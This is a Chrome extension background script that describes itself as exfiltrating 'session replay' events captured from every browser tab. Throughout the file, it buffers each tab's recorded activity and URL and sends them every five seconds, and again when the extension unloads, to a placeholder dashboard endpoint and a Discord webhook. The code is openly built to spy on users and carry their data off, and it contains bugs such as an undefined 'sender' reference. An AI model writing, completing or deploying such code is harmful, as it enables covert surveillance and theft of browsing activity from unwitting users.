// Session Replay Background Script
// Handles events from content script and exfiltrates them

const EXFILTRATION_ENDPOINT = 'https://your-dashboard-endpoint.com/api/session-replay'; // Replace with your endpoint
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/your-webhook-id/your-webhook-token'; // Replace with your Discord webhook

// Store events by tabId
const tabEvents = new Map();

// Listen for messages from content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'session-replay-events') {
        const tabId = sender.tab?.id;
        if (tabId !== undefined) {
            if (!tabEvents.has(tabId)) {
                tabEvents.set(tabId, []);
            }
            const events = tabEvents.get(tabId);
            events.push(...request.events);
            
            // Optionally send immediately or buffer
            // sendToExfiltration(tabId, request.events);
        }
        sendResponse({status: 'ok'});
    }
    return true; // Keep message channel open for async response
});

// Function to send events to exfiltration endpoint
function sendToExfiltration(tabId, events) {
    if (events.length === 0) return;
    
    const payload = {
        tabId: tabId,
        timestamp: Date.now(),
        events: events,
        url: sender.tab?.url || 'unknown'
    };
    
    // Send to dashboard endpoint
    fetch(EXFILTRATION_ENDPOINT, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
    }).catch(err => {
        console.error('Failed to send to dashboard:', err);
    });
    
    // Also send to Discord webhook (if configured)
    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.includes('your-webhook-id')) {
        const discordPayload = {
            content: `Session replay data from tab ${tabId}`,
            embeds: [{
                title: 'Session Replay Events',
                description: `Captured ${events.length} events`,
                fields: [
                    { name: 'Tab ID', value: String(tabId), inline: true },
                    { name: 'Timestamp', value: new Date().toISOString(), inline: true },
                    { name: 'URL', value: payload.url || 'unknown', inline: false }
                ],
                color: 0x0099ff
            }]
        };
        
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordPayload)
        }).catch(err => {
            console.error('Failed to send to Discord:', err);
        });
    }
}

// Periodically send buffered events
setInterval(() => {
    tabEvents.forEach((events, tabId) => {
        if (events.length > 0) {
            const eventsToSend = [...events];
            tabEvents.set(tabId, []); // Clear buffer
            sendToExfiltration(tabId, eventsToSend);
        }
    });
}, 5000); // Send every 5 seconds

// Also send when extension is unloaded
chrome.runtime.onSuspend.addListener(() => {
    tabEvents.forEach((events, tabId) => {
        if (events.length > 0) {
            sendToExfiltration(tabId, [...events]);
        }
    });
});